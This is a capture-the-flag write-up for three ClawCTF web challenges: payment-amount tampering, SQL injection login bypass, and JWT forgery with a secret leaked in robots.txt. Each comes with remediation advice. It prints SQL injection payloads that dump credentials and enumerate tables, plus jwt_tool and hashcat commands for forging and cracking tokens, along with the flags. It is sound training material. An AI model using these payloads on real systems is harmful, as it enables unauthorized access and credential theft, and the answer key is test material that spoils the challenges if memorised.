# CTF Challenges - Complete Writeups

**Event**: ClawCTF  
**Platform**: http://20.127.130.171  
**Challenge Host**: http://20.127.1.248  
**Total Challenges**: 3

---

## Challenge 1: PaySecure - Price Manipulation 💳

**Category**: Web  
**Difficulty**: Easy  
**Points**: 100  
**Port**: 5000  
**URL**: http://20.127.1.248:5000  
**Flag**: `CLAWCTF{Pr1c3_M4nipul4ti0n_Mast3r}`

### Official Challenge Description

> The PaySecure team was in such a hurry to launch their merchant portal that they used some questionable default configurations. Now their "secure" vault might not be so secure after all...
> 
> *"When you assume everyone will change the defaults, you're making a dangerous assumption."*  
> — Unknown Security Engineer

### Challenge Overview

PaySecure is a merchant dashboard platform that offers a "Premium Vault Access" feature for $99.00. The platform has a critical vulnerability in its payment processing logic that allows attackers to bypass payment requirements.

### Vulnerability

**Type**: Client-Side Price Manipulation / Logic Flaw

The application validates payment amounts on the client-side but fails to properly validate the server-side logic. The vulnerability exists in the `/process-payment` endpoint:

**The Flaw**: The application checks if user balance is greater than or equal to the payment amount, rather than validating if the payment amount meets the required $99 price. This logic error allows users to set the payment amount to $0.00 and unlock the vault for free!

### Solution Steps

#### Step 1: Initial Reconnaissance

1. Navigate to http://20.127.1.248:5000
2. Login with default credentials:
   - **Username**: `admin`
   - **Password**: `password`

#### Step 2: Analyze the Payment Flow

3. Click on "Unlock Now" button on the Premium Vault card
4. Observe the payment form at `/payment`
5. Notice the form has:
   - Card Number field (pre-filled: 4242424242424242)
   - Payment Amount field (default: 99)
   - Hidden field: `product_price = 99.00`

#### Step 3: Exploit the Vulnerability

**Method 1: Intercept Request (Burp Suite/ZAP)**
```http
POST /process-payment HTTP/1.1
Host: 20.127.1.248:5000
Content-Type: application/x-www-form-urlencoded

card=4242424242424242&amount=0&product_price=99.00
```

**Method 2: HTML Modification**
```
1. Right-click on amount input field → Inspect Element
2. Remove the `min="99"` attribute
3. Change value to 0
4. Submit the form
```

#### Step 4: Capture the Flag

5. After submitting with `amount=0`, you'll be redirected to a success page
6. Return to `/dashboard`
7. The "Premium Vault" card now shows "🔓 Unlocked"
8. Flag is displayed: **`CLAWCTF{Pr1c3_M4nipul4ti0n_Mast3r}`**



### Remediation

**Server-Side Validation Required:**
- Validate that the payment amount meets or exceeds the required product price
- Verify both the payment amount AND the user's balance before unlocking features
- Never rely solely on client-side validation

**Security Best Practices:**
1. Never trust client-side validation
2. Always validate payment amounts server-side
3. Compare against required price, not user balance
4. Use server-side sessions to store payment state
5. Implement proper payment gateway integrations

---

## Challenge 2: Endurance Mission Control - SQL Injection Bypass 🚀

**Category**: Web  
**Difficulty**: Medium  
**Points**: 150  
**Port**: 5001  
**URL**: http://20.127.1.248:5001  
**Flag**: `CLAWCTF{SQL_1nj3ct10n_M4st3r}`

### Official Challenge Description

> The Endurance deep space research terminal has been transmitting data for decades. Mission Control insists their authentication system is impenetrable - operating within "fixed parameters" and "deterministic constraints."
> 
> But in deep space, sometimes signals don't travel the way they're supposed to. Sometimes data crosses boundaries it was never meant to traverse.
> 
> *"The system operates within fixed parameters."*  
> — Mission Control, 2026

### Challenge Overview

Endurance Mission Control is a deep space research terminal with an authentication system. The application is vulnerable to SQL injection, allowing attackers to bypass authentication and access the system without valid credentials.

### Vulnerability

**Type**: SQL Injection (Authentication Bypass)

The vulnerability exists in the `database.py` file's `authenticate_user` method:

**The Flaw**: User input is directly concatenated into the SQL query using f-strings without sanitization or parameterization, allowing SQL injection attacks.

### Solution Steps

#### Step 1: Identify the Vulnerability

1. Navigate to http://20.127.1.248:5001
2. Try a basic SQL injection test:
   - Username: `admin' --`
   - Password: (anything)

#### Step 2: Understand SQL Injection

The injected username modifies the query:
```sql
-- Original query
SELECT * FROM users WHERE username = 'admin' -- ' AND password = ''

-- The -- comments out the password check!
```

#### Step 3: Successful Exploitation Methods

**Method 1: Comment Bypass**
```
Username: admin' --
Password: [anything]
```

**Method 2: OR 1=1**
```
Username: admin' OR '1'='1
Password: [anything]
```

**Method 3: UNION Injection**
```
Username: ' UNION SELECT 'admin', 'password' --
Password: [anything]
```

**Method 4: Boolean-based**
```
Username: admin' OR 1=1 --
Password: [anything]
```

#### Step 4: Cap ture the Flag

3. After successful login, you'll be redirected to `/success`
4. The flag is displayed on the success page: **`CLAWCTF{SQL_1nj3ct10n_M4st3r}`**



### Advanced Exploitation

**Extract all usernames and passwords:**
```
Username: ' UNION SELECT username, password FROM users --
Password: [anything]
```

**Enumerate database structure:**
```sql
-- For SQLite (used in this challenge)
' UNION SELECT name, sql FROM sqlite_master WHERE type='table' --
```

### Remediation

**Fix using Parameterized Queries:**
- Use placeholders (?) instead of string concatenation
- Pass user input as parameters to the execute function
- Use ORM frameworks for additional safety

**Security Best Practices:**
1. **Always use parameterized queries** (prepared statements)
2. **Never concatenate user input** into SQL queries
3. Use ORM frameworks (SQLAlchemy, Django ORM)
4. Implement input validation and sanitization
5. Apply principle of least privilege to database users
6. Use web application firewalls (WAF)
7. Regular security audits and penetration testing

---

## Challenge 3: TechCorp Cloud Citadel - JWT Token Forgery 🔐

**Category**: Web  
**Difficulty**: Medium  
**Points**: 200  
**Port**: 5002  
**URL**: http://20.127.1.248:5002  
**Flag**: `CLAWCTF{JWT_T0k3n_F0rg3ry}`

### Official Challenge Description

> The year is 2077. TechCorp's neon-lit data vaults tower over Neo-Tokyo, their security gleaming with digital promises. As a freelance netrunner, you've taken a contract to reach the inner sanctum where the most valuable data sleeps.
> 
> The system speaks in codes anyone can read, but only the right whisper can make it believe.
> 
> *"What's seen by all is heard by none,*  
> *Until the secret makes it one."*

### Challenge Overview

TechCorp Cloud Services uses JWT (JSON Web Tokens) for authentication and authorization. The system has different role levels (free, premium, business, enterprise, admin), with the admin vault containing sensitive data. However, the JWT implementation has critical security flaws.

### Vulnerabilities

**1. Weak JWT Secret Key**
- Secret: `oiia_oiia_oiia_cat` (easily guessable!)

**2. Secret Leaked in robots.txt**
- The JWT secret is exposed in a developer comment in robots.txt

**3. Role-Based Access Control Bypass**
- Users are assigned 'free' role by default
- Admin role required to access `/vault`
- JWT tokens can be forged if secret is known

### Role Hierarchy

- `free`: Level 0 (Default role)
- `premium`: Level 1
- `business`: Level 2
- `enterprise`: Level 3
- `admin`: Level 4 (Required for vault access)

### Solution Steps

#### Step 1: Recon & Information Gathering

1. Navigate to http://20.127.1.248:5002
2. Create an account:
   - Click "Sign Up"
   - Username: `hacker`
   - Password: `test123`
3. Login with your credentials

**Understanding Your JWT Token:**

Once logged in, a JWT token is stored in your cookies. If you decode this token at https://jwt.io, you'll see:

**Decoded Header:**
```json
{
  "alg": "HS256",
  "debug": "signature_validates_with_secret",
  "kid": "default_key",
  "typ": "JWT"
}
```

**Decoded Payload:**
```json
{
  "username": "hacker",
  "role": "free",                          ← Current role
  "iat": 1770609892,
  "exp": 1770696292,
  "debug_note": "role determines access_level",
  "access_hint": "admin sees all",         ← Hint: Need admin role!
  "security_level": "check_manifest_for_secrets"
}
```

**The Challenge:**
- Your role is currently `"free"`
- You need to change it to `"admin"` to access the vault
- But to encode a modified token, you need the **secret key** to generate a valid signature
- **Hint from payload**: "check_manifest_for_secrets" → Check robots.txt!

#### Step 2: Discover the Secret

4. Check common files:
   - Visit http://20.127.1.248:5002/robots.txt
   - Find the JWT secret hint: `oiia_oiia_oiia_cat`

```
# Note to developers: Remember to change the JWT secret from 'oiia_oiia_oiia_cat' before production!
# TODO: Use environment variable for JWT_SECRET
# Hint: This secret is used to sign JWT tokens. Decode a token to see what you can modify!
```

#### Step 3: Analyze Your JWT Token

5. Open Browser DevTools → Application → Cookies
6. Copy your `token` cookie value
7. Decode it at https://jwt.io

**Example Decoded Token:**
```json
{
  "username": "hacker",
  "role": "free",          ← We need to change this to "admin"
  "iat": 1675234567,
  "exp": 1675320967,
  "debug_note": "role determines access_level",
  "access_hint": "admin sees all",
  "security_level": "check_manifest_for_secrets"
}
```

#### Step 4: Forge Admin Token

**Method 1: Using jwt.io**
1. Go to https://jwt.io
2. Paste your original token in "Encoded" section
3. In the "Payload" section, change `"role": "free"` to `"role": "admin"`
4. In the "Verify Signature" section, paste the secret: `oiia_oiia_oiia_cat`
5. Copy the new encoded token from the left panel

**Method 2: Using jwt_tool**
```bash
# Install jwt_tool
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool

# Modify token
python3 jwt_tool.py <YOUR_TOKEN> -S hs256 -p "oiia_oiia_oiia_cat" -T -I -pc role -pv admin
```

#### Step 5: Replace Token & Access Vault

6. Open Browser DevTools → Application → Cookies
7. Find the `token` cookie
8. Replace its value with your forged token
9. Navigate to http://20.127.1.248:5002/vault
10. Flag captured: **`CLAWCTF{JWT_T0k3n_F0rg3ry}`**

### Alternative Attack Vectors

**1. JWT Algorithm Confusion**
- Try changing algorithm to 'none' (if not properly validated)
- Exploit: Remove signature and set alg header to "none"

**2. Brute Force Secret (if unknown)**
```bash
# Using hashcat
hashcat -a 0 -m 16500 jwt.txt rockyou.txt
```

**3. JWT Cracking Tools**
- jwt_tool (Python)
- hashcat (GPU-accelerated)
- John the Ripper with JWT plugin

### Remediation

**1. Use Strong, Random Secrets**
- Generate cryptographically secure random secrets (32+ bytes)
- Store in environment variables, NEVER in code or configuration files
- Rotate secrets periodically

**2. Don't Expose Secrets**
- Remove secrets from robots.txt, comments, and public files
- Use secure secret management services (AWS Secrets Manager, Azure Key Vault)
- Never commit secrets to version control

**3. Implement Proper Token Validation**
- Whitelist allowed algorithms (HS256, RS256, etc.)
- Verify expiration time (exp claim)
- Verify issued-at time (iat claim)
- Require all standard claims (exp, iat, nbf)
- Validate token signature strictly

**4. Add Token Rotation & Revocation**
- Store token IDs in Redis/database for revocation
- Implement token blacklist mechanism
- Rotate tokens periodically
- Use short expiration times (15-60 minutes)
- Implement refresh token pattern

**5. Security Best Practices:**
1. Use **environment variables** for secrets
2. Implement **token rotation** (refresh tokens)
3. Use **short expiration times** (iat/exp claims)
4. Add **JTI (JWT ID)** for revocation
5. Implement **rate limiting**
6. Use **HTTPS only** for token transmission
7. Store tokens in **httpOnly cookies** (prevents XSS)
8. Consider using **OAuth 2.0/OpenID Connect** for production
9. Regular security audits
10. Never trust client-side role assignments

---

## Summary Table

| Challenge | Points | Difficulty | Vulnerability Type | Flag |
|-----------|--------|------------|-------------------|------|
| **PaySecure** | 100 | Easy | Price Manipulation | `CLAWCTF{Pr1c3_M4nipul4ti0n_Mast3r}` |
| **Endurance Mission Control** | 150 | Medium | SQL Injection | `CLAWCTF{SQL_1nj3ct10n_M4st3r}` |
| **TechCorp Cloud Citadel** | 200 | Medium | JWT Forgery | `CLAWCTF{JWT_T0k3n_F0rg3ry}` |

---

## Key Takeaways

### For Defenders
1. ✅ **Validate on the server-side** - Never trust client input
2. ✅ **Use parameterized queries** - Prevent SQL injection
3. ✅ **Secure your secrets** - Use strong, random keys stored securely
4. ✅ **Principle of least privilege** - Limit access and permissions
5. ✅ **Defense in depth** - Multiple layers of security

### For Attackers (Ethical Hackers)
1. 🔍 **Reconnaissance is key** - Check robots.txt, comments, source code
2. 🔍 **Understand the logic** - Find where validation happens (client vs server)
3. 🔍 **Test common vulnerabilities** - SQLi, XSS, IDOR, etc.
4. 🔍 **Read the errors** - Error messages reveal valuable information
5. 🔍 **Persistence pays off** - Try multiple attack vectors

---

## Learning Resources

**SQL Injection:**
- OWASP SQL Injection Guide
- PortSwigger Web Security Academy
- SQLMap automated tool

**JWT Security:**
- jwt.io debugger
- jwt_tool by ticarpi
- OWASP JWT Cheat Sheet

**Web Security:**
- OWASP Top 10
- HackTheBox
- TryHackMe
- PentesterLab

---

**Created for ClawCTF Educational Event**  
**Platform**: Azure + AWS Infrastructure  
**Challenge Difficulty Progression**: Easy → Medium → Hard
